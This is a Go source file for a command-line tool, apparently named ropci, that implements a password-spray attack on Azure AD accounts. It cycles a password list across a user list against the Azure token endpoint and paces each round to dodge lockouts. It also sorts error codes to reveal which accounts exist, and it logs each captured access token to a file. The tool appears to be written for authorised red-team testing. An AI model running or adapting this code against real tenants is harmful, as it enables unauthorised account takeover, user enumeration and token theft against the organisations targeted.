/*
Copyright © 2022 WUNDERWUZZI23
*/
package cmd

import (
	"fmt"
	"os"
	"ropci/models"
	"ropci/utils"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"
)

// sprayCmd represents the spray command
var sprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Perform a password spray",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {

		readViperSettings()

		users := utils.ReadFileAsStringArray(sprayUsersFile)
		pwds := utils.ReadFileAsStringArray(sprayPasswordsFile)

		if len(pwds) > 5 && !sprayForce {
			fmt.Println("WARNING: You are trying many passwords. This could cause issues like account lockouts.")
			fmt.Println("Use --force to perform this operation.")
			return
		}

		attempts := len(users) * len(pwds)
		if attempts == 0 {
			fmt.Println("Please check your input files, at least one of them is empty.")
			return
		}

		fmt.Printf("Attempts: %d for ClientID %s\n", attempts, authClientID)
		fmt.Printf("Wait configuration. Wait per round: %ds. Wait per try: %ds.\n\n", sprayWaitRound, sprayWaitTry)

		// create output file
		outfile, err := os.OpenFile(sprayOutputfile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0640)
		if err != nil {
			fmt.Println(err)
			return
		}
		defer outfile.Close()

		tokch := make(chan authLogonResult, 20)

		//simple wait group :)
		count := 0
		round := 0

		wg := &sync.WaitGroup{}

		for _, p := range pwds {

			if round > 0 {
				if sprayWaitRound > 0 {
					fmt.Printf("* Waiting %d seconds before next round...\n", sprayWaitRound)
				}
				d := time.Duration(sprayWaitRound * int(time.Second))
				time.Sleep(d)
			}

			for _, u := range users {

				conf := &models.OAuth2Config{
					Username:      u,
					Password:      p,
					ClientID:      authClientID,
					Scopes:        authScopes,
					TokenEndpoint: utils.GetAzureTokenEndpoint(authTenant),
				}

				wg.Add(1)

				go logon(tokch, conf, "Spray Token")
				go processResults(wg, tokch, outfile, round, count)

				count++

				d := time.Duration(sprayWaitTry * int(time.Second))
				time.Sleep(d)
			}

			//reset count
			count = 0
			round++
		}

		fmt.Println("* Waiting for all routines to complete...")
		wg.Wait()
		fmt.Println("* Done.")
	},
}

var (
	sprayUsersFile     string
	sprayPasswordsFile string
	sprayOutputfile    string
	sprayForce         bool
	sprayWaitRound     int
	sprayWaitTry       int
)

func init() {
	authCmd.AddCommand(sprayCmd)

	sprayCmd.Flags().StringVarP(&sprayUsersFile, "users-file", "", "users.list", "Flat file with usernames (upns)")
	sprayCmd.Flags().StringVarP(&sprayPasswordsFile, "passwords-file", "", "passwords.list", "Flat file with passwords to try for each user")
	sprayCmd.Flags().StringVarP(&sprayOutputfile, "outputfile", "o", "", "write results to this file")
	sprayCmd.Flags().BoolVarP(&sprayForce, "force", "F", false, "Force running even when more then 5 passwords will be tried.")
	sprayCmd.Flags().IntVarP(&sprayWaitRound, "wait", "w", 60, "Seconds to wait after each round (after cycling through one password for all users).")
	sprayCmd.Flags().IntVarP(&sprayWaitTry, "wait-try", "", 1, "Seconds to wait after each try.")

	sprayCmd.MarkFlagRequired("users-file")
	sprayCmd.MarkFlagRequired("passwords-file")
	sprayCmd.MarkFlagRequired("outputfile")

}

func processResults(wg *sync.WaitGroup, tokch chan authLogonResult, outfile *os.File, round int, count int) {

	defer wg.Done()

	// // collect results from channel
	// for i := 0; i < count; i++ {

	res := <-tokch

	friendlyError := res.Token.Error
	if strings.Index(res.Token.Error, "AADSTS50126") > 0 {
		friendlyError = "invalid username or password"
	} else if strings.Index(res.Token.Error, "AADSTS50034") > 0 {
		friendlyError = "account does not exist"
	} else if res.Token.Error == "" {
		friendlyError = "success"
	}

	line := fmt.Sprintf("%003d-%0004d: %-48s\t%-28s\t%s\t%s\t%s\n",
		round+1, count+1,
		res.Conf.Username,
		res.Conf.Password, friendlyError,
		res.Token.Error, //to the file we also write the original error (includes timestamps)
		"AccessToken::"+res.Token.AccessToken)

	outfile.WriteString(line)

	fmt.Printf("Attempt %003d-%0004d: %-38s\t%-25s\t%s\n", round+1, count+1, res.Conf.Username, res.Conf.Password, friendlyError)
	//}

}
